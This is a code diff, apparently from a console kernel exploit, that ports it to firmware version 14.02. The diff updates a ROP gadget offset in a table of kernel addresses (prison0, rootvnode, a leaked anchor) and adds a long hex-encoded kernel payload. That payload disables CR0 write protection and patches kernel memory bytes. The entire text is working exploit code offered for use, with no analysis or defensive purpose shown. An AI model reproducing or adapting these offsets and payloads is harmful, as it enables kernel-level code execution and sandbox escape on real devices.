@@ -50,7 +50,7 @@ const S = {
 const FIRMWARE = {
   "14.02": {
     anchor:    0xE6C30,   /* the lock the leak hands us */
-    swap_rbp:  0xa80f68,   /* xchg rbp,rax ; ret */
+    swap_rbp:  0xa81478,   /* xchg rbp,rax ; ret */
     prison0:   0x111fa18,   /* holds a pointer to prison0, so read it */
     rootvnode: 0x2136e90,
     padding:   0xB3A290,   /* start of the zero run behind kernel text */
@@ -120,6 +120,8 @@ const PROBE_NODES = ["/dev/rng", "/dev/urandom", "/dev/random", "/dev/zero", "/d
    is one blob per firmware. Between 13.52 and 14.00 exactly two of its ten
    write targets moved -- the two 0x33 -> 0x37 immediates. */
 const BOOTSTRAP_TABLE = {
+  "14.02":
+    "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981637c1b00b8eb04000041b9eb00000041baeb000000668981bcce2f0041bbeb000000b890e9ffff4881c21ba17c006689b1737c1b006689b9937c1b0066448981048b6200c681cd0a0000ebc6819dda2b00ebc681e1da2b00ebc6815ddb2b00ebc681a1db2b00ebc6814ddd2b00ebc681fde12b00ebc681cde22b00eb66448989ef936200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68136233900eb66898124771b00c781d87c1b0090e93c01c78190e73b004831c0c3c681daae1f0037c681ddae1f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3",
   "14.00":
       "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
     + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
